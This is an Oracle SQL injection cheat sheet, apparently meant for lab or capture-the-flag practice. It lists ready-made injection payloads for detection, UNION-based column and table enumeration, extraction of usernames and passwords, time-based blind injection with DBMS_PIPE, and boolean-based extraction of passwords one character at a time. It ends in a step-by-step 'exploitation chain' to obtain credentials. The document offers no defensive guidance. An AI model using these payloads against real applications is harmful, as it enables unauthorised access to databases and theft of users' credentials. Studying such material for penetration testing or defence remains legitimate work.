# SQL Injection - Quick Cheat Sheet

## 🔴 Critical Oracle Rules

1. **MUST use `FROM dual`** - Every SELECT needs a table
2. **Table names UPPERCASE** - In WHERE clauses for system tables
3. **Use `all_tables`** - Not `information_schema.tables`
4. **Use `all_tab_columns`** - Not `information_schema.columns`
5. **Only `--` comments** - `#` doesn't work

---

## Detection

```sql
# Basic test
'
' OR 1=1--

# Oracle-specific
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',1)--

# Version check
'+UNION+SELECT+banner,NULL+FROM+v$version--
```

---

## Column Enumeration

```sql
# 1 column
'+UNION+SELECT+NULL+FROM+dual--

# 2 columns
'+UNION+SELECT+NULL,NULL+FROM+dual--

# 3 columns
'+UNION+SELECT+NULL,NULL,NULL+FROM+dual--

# Test visibility
'+UNION+SELECT+'A','B'+FROM+dual--
```

---

## Information Gathering

```sql
# Current user
'+UNION+SELECT+user,NULL+FROM+dual--

# Database version
'+UNION+SELECT+banner,NULL+FROM+v$version--

# Current schema
'+UNION+SELECT+SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),NULL+FROM+dual--
```

---

## List Tables

```sql
# All accessible tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

# Current user's tables only
'+UNION+SELECT+table_name,NULL+FROM+user_tables--

# Filter by owner
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+owner='HR'--
```

---

## List Columns

```sql
# ⚠️ Table name MUST be UPPERCASE!

# All columns in table
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--

# With data types
'+UNION+SELECT+column_name,data_type+FROM+all_tab_columns+WHERE+table_name='USERS'--
```

---

## Extract Data

```sql
# Basic extraction
'+UNION+SELECT+username,password+FROM+users--

# String concatenation (use ||)
'+UNION+SELECT+username||':'||password,NULL+FROM+users--

# Limit results (use ROWNUM)
'+UNION+SELECT+username,password+FROM+users+WHERE+ROWNUM<=5--
```

---

## Oracle vs MySQL

| Feature | MySQL | Oracle |
|---------|-------|--------|
| **SELECT** | `SELECT 1` | `SELECT 1 FROM dual` ✅ |
| **Concat** | `CONCAT('a','b')` | `'a'\|\|'b'` ✅ |
| **Substring** | `SUBSTRING(x,1,5)` | `SUBSTR(x,1,5)` ✅ |
| **Limit** | `LIMIT 5` | `WHERE ROWNUM<=5` ✅ |
| **Tables** | `information_schema.tables` | `all_tables` ✅ |
| **Columns** | `information_schema.columns` | `all_tab_columns` ✅ |
| **Comment** | `--` or `#` | `--` only ✅ |

---

## Common Errors

| Error | Cause | Fix |
|-------|-------|-----|
| `ORA-00933` | Missing `FROM dual` | Add `FROM dual` |
| `ORA-00942` | Table doesn't exist | Check table name UPPERCASE |
| `ORA-00913` | Too many columns | Reduce column count |
| `ORA-00947` | Not enough columns | Add more columns |

---

## Blind SQLi - Time-Based

```sql
# 5 second delay
'+AND+DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--

# Conditional delay
'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+ELSE+0+END+FROM+dual)=1--
```

---

## Blind SQLi - Boolean-Based

```sql
# Test if table exists
'+AND+(SELECT+COUNT(*)+FROM+all_tables+WHERE+table_name='USERS')>0--

# Extract char by char
'+AND+(SELECT+SUBSTR(password,1,1)+FROM+users+WHERE+username='admin')='a'--
```

---

## Full Exploitation Chain

```sql
# 1. Column count
'+UNION+SELECT+NULL,NULL+FROM+dual--

# 2. List tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

# 3. List columns (UPPERCASE table name!)
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABC123'--

# 4. Extract data
'+UNION+SELECT+username,password+FROM+USERS_ABC123--
```

---

## Quick Tips

✅ Always add `FROM dual`  
✅ Table names UPPERCASE in WHERE  
✅ Use `||` for concatenation  
✅ Use `ROWNUM` not `LIMIT`  
✅ Only `--` for comments  

❌ Don't use `#` comments  
❌ Don't use lowercase table names in WHERE  
❌ Don't forget `FROM dual`  
❌ Don't use `CONCAT()` function  

---

## One-Liner Reference

```sql
# Complete attack in one go
'+UNION+SELECT+table_name,NULL+FROM+all_tables--  
# → Find USERS_XYZ  
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ'--  
# → Find USERNAME_XYZ, PASSWORD_XYZ  
'+UNION+SELECT+USERNAME_XYZ,PASSWORD_XYZ+FROM+USERS_XYZ--  
# → Get credentials
```

---

**Remember**: `FROM dual` is NOT optional in Oracle!